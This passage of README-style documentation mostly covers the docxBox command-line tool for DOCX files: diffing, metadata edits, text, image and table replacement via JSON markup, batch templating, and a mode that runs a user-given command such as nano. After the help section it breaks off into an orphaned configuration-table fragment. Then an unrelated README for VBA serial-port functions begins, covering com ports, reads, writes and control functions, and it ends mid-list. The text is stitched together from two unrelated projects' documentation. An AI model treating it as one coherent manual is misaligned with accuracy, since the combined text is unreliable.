````docxbox diff foo_v1.docx foo_v2.docx word/settings.xml````  

Display **unified** diff:
````docxbox diff foo_v1.docx foo_v2.docx word/settings.xml -u````  
or: ````docxbox diff foo_v1.docx foo_v2.docx word/settings.xml --unified````

### Modify document

#### Modify meta data

docxBox allows to modify existing attributes, or adds attributes if not present.

* Set **creation-date**:            ````docxbox mm foo.docx created ""2020-01-29T09:21:00Z""````
* Set **creator** attribute:        ````docxbox mm foo.docx creator ""docxBox v0.0.1""````  
* Set **description** attribute:    ````docxbox mm foo.docx description ""Foo bar baz""````  
* Set **keywords** attribute:       ````docxbox mm foo.docx keywords ""Foo bar baz""````  
* Set **language** attribute:       ````docxbox mm foo.docx language ""en-US""````  
* Set **lastModifiedBy** attribute: ````docxbox mm foo.docx lastModifiedBy ""docxBox v0.0.1""````
* Set **lastPrinted** attribute:    ````docxbox mm foo.docx lastPrinted ""2020-01-10T10:31:00Z""````
* Set **modification-date**:        ````docxbox mm foo.docx modified ""2020-01-29T09:21:00Z""````
* Set **revision** attribute:       ````docxbox mm foo.docx revision 2````
* Set **subject** attribute:        ````docxbox mm foo.docx subject ""Foo bar""````
* Set **title** attribute:          ````docxbox mm foo.docx title ""Foo bar, baz""````

**Notes:** 

1. Altering meta data does NOT automatically update preview texts of
   generic fields, which display respective meta data.  
   For updating field values, use the 
   [``sfv``](#set-field-value-merge-fields-generic-fields) command.
2. All modifications automatically update the ``modification-date`` attribute
   to the current timestamp, unless explicitly setting a different one.
3. During [Batch Templating](#batch-templating) the ``modification-date`` is
   not updated automatically.
    

To alter/insert an attribute and save the modified document to a new file:  
````docxbox mm foo.docx <attribute> <value> new.docx````

To update multiple meta attributes with one ``mm`` command, tuples of 
attribute-keys and -values can be given as JSON:
````docxbox mm foo.docx ""{\""<attribute>\"":\""<value>\"",\""<attribute>\"":\""<value>\"", ...}"" new.docx````


#### Replace image

````docxbox rpi foo.docx image1.jpeg /home/replacement.jpeg```` overwrites the 
DOCX w/ the modified document.

**Note:** The original and replacement image must be of the same format 
(bmp, gif, jpg, etc.).

````docxbox rpi foo.docx image1.jpeg /home/replacement.jpeg new.docx````  
This creates a new file: new.docx


#### Replace text

Replace all (case-sensitive) occurrences of given string in DOCX text:

````docxbox rpt foo.docx old new```` updates foo.docx  
````docxbox rpt foo.docx old new new.docx```` creates a new file new.docx  


#### Insert text into existing table

``stv`` inserts values (and cells if needed) into an existing table, starting at 
1st cell of given row. If there are less columns in the row than values given,
more rows are added after the row.

This is useful for maintaining a specific table style (borders, coloring, font, 
etc.) when rendering dynamic documents from DOCX templates. 

**Example:** Fill/Insert four cells starting w/ second row of first table in 
document:  
````docxbox stv foo.docx ""{\""table\"":1,\""row\"":2,\""values\"":[\""foo\"",\""bar\"",\""baz\"",\""qux\""]}````  

**Note:** Table and rows are indexed starting w/ 1 (not 0).

The table and row to start inserting data into can also be identified by text 
(distinct within the document) contained within a cell of that table and row:

````docxbox stv foo.docx ""{\""cell\"":\""insert-data-here\"",\""values\"":[\""foo\"",\""bar\"",\""baz\"",\""qux\""]}````


#### Replace by markup

Moreover [replacing text](#replace-text) and 
[fields](#set-field-value-merge-fields-generic-fields), docxBox supports 
rendering and inserting the following 
[Office Open XML](https://en.wikipedia.org/wiki/Office_Open_XML) elements:

* [Heading 1, 2, 3](#insert-heading)
* [Text](#insert-text)
* [Paragraph containing text](#insert-paragraph-containing-text)
* [Image](#insert-image) (formats: ``bmp``, ``emg``, ``gif``, ``jpeg``, 
  ``jpg``, ``png``, ``tif``, ``tiff``, ``wmf``)
* [Table](#insert-table)
* [Unordered list](#insert-list)  

Markup specification for such elements must be given as JSON, following these
rules: 

* JSON must be wrapped within ``{...}``
* The first item must be a type identifier (``h1``, ``h2``, ``h3``,
  ``img`` / ``image``, ``ol``, ``table``, ``ul``)
* All attributes are given associative (as JSON object related to the type) 
* The order of attributes within the config of the type is arbitrary


##### Insert heading

**Example:** Replace string ``search`` by a Heading 1 with the text 
``Foo``:  
````docxbox rpt foo.docx search ""{\""h1\"":{\""text\"":\""Foo\""}}""````  

docxBox supports rendering of Header 1, 2 and 3 (``h1``, ``h2``, ``h3``).


##### Insert text

**Example:** Replace string ``search`` (by a new run) with the text 
``Foo``:  
````docxbox rpt foo.docx search ""{\""text\"":{\""text\"":\""Foo\""}}""````  


##### Insert paragraph containing text

**Example:** Replace string ``search`` (by a new paragraph containing a run) 
with the text ``Foo``:  
````docxbox rpt foo.docx search ""{\""p\"":{\""text\"":\""Foo\""}}""````  


##### Insert hyperlink

**Example:** Replace string ``search`` by a hyperlink:    
````docxbox rpt foo.docx search ""{\""link\"":{\""text\"":\""docxBox\"",\""url\"":\""https://github.com/gyselroth/docxbox\""}}""````  


##### Insert list

Replace string ``search`` by an unordered list:  
````docxbox rpt foo.docx search ""{\""ul\"":{\""items\"":[\""item-1\"",\""item-2\"",\""item-3\""]}}""````  


##### Insert image

**Image markup specification example:** 

````
{
    ""img"":{
        ""name"":""example.jpg"",
        ""offset"":[0,0],
        ""size"":[2438400,1828800]
    }
}
````

**Specification rules:**

* The ``name`` parameter is optional
* The ``offset`` argument is optional
* Image size is per default expected to be given in EMUs 
  (= English Metric Unit, being: ``pixels * 9525``), but can also be specified 
  in Pixels like:  ``""size\"":[\""256px\"",\""192px\""]``

When inserting a new image file, it must be given as additional argument:  
````docxbox rpt foo.docx search ""{\""image\"":{\""size\"":[2438400,1828800]}}"" images/ex1.jpg````


##### Insert new table

To replace text by a newly rendered table like:

| A  | B  | C  |
|----|----|----|
| a1 | b1 | c1 |
| a2 | b2 | c2 |
| a3 | b3 | c3 | 

the table specification as JSON looks like:
````
{
    ""table"":{
        ""columns"":3,
        ""rows"":3,
        ""header"":[""A"",""B"",""C""],
        ""content"":[
            [""a1"",""b1"",""c1""],
            [""a2"",""b2"",""c2""],
            [""a3"",""b3"",""c3""]
        ]
    }
}
````

##### Specification rules:

* ``header`` is optional, when given: ``columns`` is optional
* ``content`` is optional, when given: ``rows`` is optional

Replace ``search`` by table:    
````docxbox rpt foo.docx search ""{\""table\"":{\""header\"":[\""A\"",\""B\"",\""C\""],\""content\"":[[\""a1\"",\""a2\"",\""a3\""],[\""b1\"",\""b2\"",\""b3\""],[\""c1\"",\""c2\"",\""c3\""]]}}""````


#### Remove content between text

Remove content between (and including) given strings (``left`` and ``right``):    

````docxbox rmt foo.docx left right```` updates foo.docx  
````docxbox rmt foo.docx left right new.docx```` creates a new file new.docx


#### Set field value: Merge fields, generic fields

##### Merge fields

When setting the value (text) of a **merge field**, the merge field is reduced 
to its textual component (maintaining its visual style).
  
**Note:** A particular merge field can NOT be merged repeatedly: 
merging turns the former field into a text element (the field subsequently 
does not exist as such any more).  

````docxbox sfv foo.docx ""MERGEFIELD  foo"" bar```` (Updates ``foo.docx``)  
Changes all merge fields, whose identifier begins with ``foo``, 
into the text ``bar``.  

````docxbox sfv foo.docx ""MERGEFIELD  foo"" bar new.docx````
Saves the resulting DOCX to a new DOCX file: ``new.docx``

**Hint:** To find out field identifiers use docxBox's [``lsd``](#list-fields)
command.

##### Generic fields

Setting field values includes also preview texts of otherwise
**generic fields**, which in some word processing applications have to be
updated explicitly.

````docxbox sfv foo.docx ""PRINTDATE"" ""10.01.2020""````  
Updates the shown text of all print-date fields to ``10.01.2020``.


#### Randomize document text

Replace all text of an existing document by similarly structured random 
""Lorem Ipsum"" dummy text, helpful for generating DOCX documents for testing 
purposes:

````docxbox lorem foo.docx```` updates foo.docx  
````docxbox lorem foo.docx new.docx```` creates a new file new.docx  


### Batch Templating

docxBox's batch templating mode allows to perform an arbitrary sequence of 
operations (supporting all docxBox commands for document manipulation) upon 
a given DOCX. It thereby facilitates a more extensive range of templating
options than the commands directly (= without batch templating) available.  

**Example:** docxBox does not directly support replacing merge fields by other
than plain textual content. Via batch templating, merge fields can be 
transformed into text in one step of a sequence, which can completely or in 
part, in a later step be replaced by generic content like for example a table, 
which can later be filled with more content.  


#### Replacement Pre/Post Markers
Batch templating can make use of ""markers"": optional text elements containing a 
distinct identifier string. Markers can temporarily be inserted and can 
subsequently be replaced again at a later step of the batch sequence by other 
generic content. 

**Rules:**
* Markers can be added **before** (key: ``pre``) and **after** (key: ``post``) 
  the actual generic replacement content
* Markers can either be of the type ``text`` or ``paragraph`` (or ``p``) 
  to insert surrounding line-breaks
* Markers contain a textual identifier, which can use any text (but should be 
distinct within the document)

##### Batch sequence JSON

Sequences of templating steps to be batch-processed must be given like:   
````
{
 ""<STEP_ID>"": {""<COMMAND>"": [(""<ARGUMENT_1>"",)(,""<ARGUMENT_2>"",...)]},
 ""<STEP_ID>"": {""<COMMAND>"": [(""<ARGUMENT_1>"",)(,""<ARGUMENT_2>"",...)]},
 ...
}
````

**Example:**
````
{
 ""1"": {""mm"": [""description"", ""foo""]},
 ""2"": {""rpt"": [""bar"", ""baz""]},
 ""3"": {""rpt"": [
    ""qux"", 
    {""h1"": {""text"": ""Quux""}}
 ]}
}
````

**Rules:**
* Every step must be given as a tuple of step-ID and -parameters
* ``<STEP_ID>`` is an arbitrary string, must be distinct within the sequence
* Parameters must be given as a tuple of a command and its respective arguments
* ``<COMMAND>`` accepts any of docxBox's commands for DOCX manipulation 
  ([``rmt``](#remove-content-between-text), [``rpi``](#replace-image), 
  [``rpt``](#replace-text), [``lorem``](#randomize-document-text), 
  [``mm``](#modify-meta-data) and 
  [``sfv``](#set-field-value-merge-fields-generic-fields))
* ``<ARGUMENT>``: Argument(s) for respective command, same as in non-batch mode
* When a command has no arguments (e.g. [``lorem``](#randomize-document-text)), 
  an empty array must be given though (E.g.: ``{""lorem"":[]}``)
* Arguments for markup-configuration of generic document elements can be given 
  as nested JSON   


##### Example: Replace string by heading-1 followed by table containing images 

**Templating sequence:**

1. **Step ""1"":** Replace string ``foo`` by heading-1 with the text: ``Foobar``
   (followed by a temporary marker ``my-marker-1``)
2. **Step ""2"":** Replace the marker ``my-marker-1`` by table containing 2x2 
   cells 
3. **Steps ""3"" to ""6"":** Replace (the placeholder texts within the) table cells 
   by images
4. Add new image files into docx document

**Batch config:**
````
{
 ""1"": {""rpt"": [
    ""foo"",
    {
     ""h1"": {
        ""text"": ""Foobar"",
        ""post"": {""text"": ""my-marker-1""}
     }
    }
 ]},
 ""2"": {""rpt"": [
   ""my-marker-1"",
   {
     ""table"": {
         ""columns"": 2,
         ""rows"": 2,
         ""header"": [""A"",""B""],
         ""content"": [
             [""img-a1"", ""img-b1""],
             [""img-a2"", ""img-b2""]
         ]
     }
   }  
 ]},
 ""3"": {""rpt"": [
    ""img-a1"",
    {
      ""img"": {
          ""name"": ""blue.png"",
          ""size"": [2438400, 1828800]
      }
    }  
 ]},
 ""4"": {""rpt"": [
    ""img-b1"",
    {
      ""img"": {
          ""name"": ""green.png"",
          ""size"": [2438400, 1828800]
      }
    }
 ]},
 ""5"": {
    ""rpt"": [
      ""img-a2"",
      {
        ""img"":{
          ""name"": ""orange.png"",
          ""size"": [2438400, 1828800]
        }
      }
 ]},
 ""6"": {""rpt"": [
    ""img-b2"",
    {
      ""img"": {
          ""name"": ""red.png"",
          ""size"": [2438400,1828800]
      }
    }
 ]}  
}
````

**The full batch command:**

**Note:** As when inserting new images in non-batch mode 
(via [``rpt``](#insert-image) or [``rpi``](#replace-image)), also during batch
templating, image files to be added into the document must be given as trailing 
arguments.
 
````docxbox batch foo.docx ""{\""1\"":{\""rpt\"":[\""foo\"",{\""h1\"":{\""text\"":\""Foobar\"",\""post\"":{\""text\"":\""my-marker-1\""}}}]},\""2\"":{\""rpt\"":[\""my-marker-1\"",{\""table\"":{\""columns\"":2,\""rows\"":2,\""header\"":[\""A\"",\""B\""],\""content\"":[[\""img-a1\"",\""img-b1\""],[\""img-a2\"",\""img-b2\""]]}}]},\""3\"":{\""rpt\"":[\""img-a1\"",{\""img\"":{\""name\"":\""blue.png\"",\""size\"":[2438400,1828800]}}]},\""4\"":{\""rpt\"":[\""img-b1\"",{\""img\"":{\""name\"":\""green.png\"",\""size\"":[2438400,1828800]}}]},\""5\"":{\""rpt\"":[\""img-a2\"",{\""img\"":{\""name\"":\""orange.png\"",\""size\"":[2438400,1828800]}}]},\""6\"":{\""rpt\"":[\""img-b2\"",{\""img\"":{\""name\"":\""red.png\"",\""size\"":[2438400,1828800]}}]}}"" blue.png green.png orange.png red.png````


##### Save batch processed document to new file

To save the resulting document of batch processed manipulations to a new file, 
instead of overwriting the source document, the destination filename can 
optionally be given as the very last argument (also trailing other optional 
arguments like image files):

````docxbox batch foo.docx ""{\""1\"":{\""mm\"":[\""description\"",\""foo\""]},\""2\"":{\""rpt\"":[\""bar\"",\""baz\""]},\""3\"":{\""rpt\"":[\""qux\"",{\""h1\"":{\""text\"":\""Quux\""}}]}}"" new.docx```` 


### Arbitrary manual and scripted analysis / modification

docxBox eases conducting arbitrary modifications on files contained within a 
DOCX, manually and scripted.  
All steps besides the actual modification are automated via docxBox, with the 
respective user-defined modification inserted.

**Example - Edit XML file manually:**

````docxbox cmd foo.docx ""nano *DOCX*/word/document.xml""````  

docxBox in the above example does:
1. **Unzip** ``foo.docx``
2. **Indent** all extracted XML files
3. Render (= replace ``*DOCX*`` w/ the resp. extraction path)  
  and **execute** the command: ``nano *DOCX*/word/document.xml``, 
  thereby opening ``document.xml`` for editing in nano, halting docxBox until 
  exiting the editor.
4. **Unindent** all extracted XML files
5. **Zip** the extracted files back into ``foo.docx``


### Output docxBox help or version number

````docxbox````  
or ````docxbox h````    
Outputs docxBox's help text.

````docxbox h <command>```` Outputs more help on a given command.  

````docxbox v```` Outputs the installed docxBox's version number.

| ``docxBox_clear_log_on_start`` | ``0`` = docxBox appends notifications to logfile                                | ``0``      |
|                                | ``1`` = docxBox resets the logfile on startup                                   |            |
| ``docxBox_verbose``            | ``0`` = Only most relevant notifications, if not disabled, are output to stdout | ``0``      |
|                                | ``1`` = If enabled, all modification notifications are output to stdout         |            |

This is the simplified set of VBA Serial Port functions for use with **one pre-defined Com Port only**.

Intended for use with serial devices which have a well-defined set of short commands and responses. 

No debug or extended transmit & receive functionality is provided. 

No other files, licences, payments or registrations are required.  

Functions can be used directly in Excel cells as Formulas where appropriate. 


<details>

<summary>Com Ports</summary>

<p>
  
- Functions work with both Hardware and Virtual (software) Com Port types 
 
- All API functions are `'Synchronous'` as some port types do not respond correctly in `'Overlapped'` mode  

</p>

</details>

<details>

<summary>Read Functions</summary>

<p>
  
_Assume that all data has already been sent by the attached serial device and is ready waiting to be read_

- `check_com_port` can be used to confirm expected number of characters are waiting before committing read 

- No pre or post read delays for any in-flight data reception to complete are provided.
  
- Data will be read in one synchronous API call.
  
- Maximum characters per read call = `READ_BUFFER_LENGTH`
  
- `check_com_port` function can be used again to check for any new or remaining characters. 
    
</p>

</details>

<details>
  
<summary>Write Functions</summary>
 
<p>

Writes are synchronous and functions can block until outgoing data is processed or write timer expires 
    
- Short strings will return quickly as data is buffered for transmission    
- Maximum number of characters sent is limited by write timer value in milliseconds
- Character limit per send is approximately = ( Baud Rate * WRITE_CONSTANT ) / 10000

</p>

</details>

<details>
  
<summary>Control Functions</summary>

<p>

### Com Port Start, Stop ###
  
- Allow a few MilliSeconds for functions to return and for any attached hardware to stabilise   
- Functions return `True` or `False` to indicate success or failure  
  
### Data Waiting Check ###
  
- Function returns number of characters waiting to be read   
- Return number can be zero if no data waiting  
- Return value of -1 indicates error, including port not started 
  
### Device Ready Check ###  

- Function returns `True` if port started and **Data Set Ready** input signal is active
